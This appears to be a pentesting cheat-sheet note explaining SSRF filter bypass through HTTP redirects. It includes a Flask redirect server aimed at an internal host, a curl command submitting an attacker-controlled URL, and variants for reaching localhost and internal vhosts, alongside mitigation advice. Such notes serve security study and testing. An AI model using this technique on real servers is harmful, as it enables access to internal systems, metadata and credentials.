---
topic: SSRF filter bypass with redirects
tags: [web, ssrf, redirects, allowlist, bypass]
---

# SSRF filter bypass with redirects

[🌐 Español](ssrf-redirect-bypass.md) | **English**

## Concept

SSRF occurs when the server fetches a user-controlled URL. If the filter validates the initial URL but the HTTP client follows redirects, an external domain can return `302` to an internal destination and bypass the check.

## When it applies

- The application accepts a URL and returns the content.
- The filter blocks `localhost`, `127.0.0.1` or internal names.
- The client follows redirects automatically.

## Procedure

1. Confirm the server fetches the URL and shows the response.
2. Host an endpoint redirecting to the internal host or vhost.
3. Send the external URL to the vulnerable parameter.
4. Use SSRF to read files, metadata or internal panels.

```python
from flask import Flask, redirect
app = Flask(__name__)
@app.route("/")
def go():
    return redirect("http://admin.internal/")
app.run(host="0.0.0.0", port=80)
```

```bash
curl --data-urlencode 'url=http://<ATTACKER>/' http://<IP>/fetch
```

## Variants

- Redirect to `http://127.0.0.1:8080` or an internal vhost.
- Chain redirects to evade blacklists.
- Use a domain resolving to an internal IP.

## Limitations

- The client must follow redirects.
- The internal destination must be reachable from the server.
- Some clients block scheme or host changes.

## Mitigation and detection

- Validate the final destination after DNS resolution and redirects.
- Use a strict allowlist of schemes, hosts and ports.
- Block private ranges and metadata endpoints in the client.

## References

- <https://owasp.org/www-community/attacks/Server_Side_Request_Forgery>
- <https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>
- <https://attack.mitre.org/techniques/T1190/>
